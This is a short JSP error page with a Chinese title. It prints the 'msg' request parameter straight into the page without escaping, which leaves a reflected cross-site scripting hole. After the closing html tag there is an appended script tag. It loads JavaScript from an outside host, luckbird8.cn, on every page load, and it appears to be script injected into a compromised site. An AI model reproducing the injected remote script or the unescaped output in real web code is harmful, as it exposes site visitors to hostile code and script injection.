<%@ page
 contentType="text/html;charset=GBK"
 isErrorPage="true"
 session="true"
%>
<html>
<head>
	<title>错误</title>
</head>
<body style="color:red;"><br><br><br><br>
	<center>
		<%//收取错误信息并输出到网页给用户看
			String sError=request.getParameter("msg");
			out.println("<br>");
			out.println(sError);
		%>
		<hr></hr>
	</center>
</body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>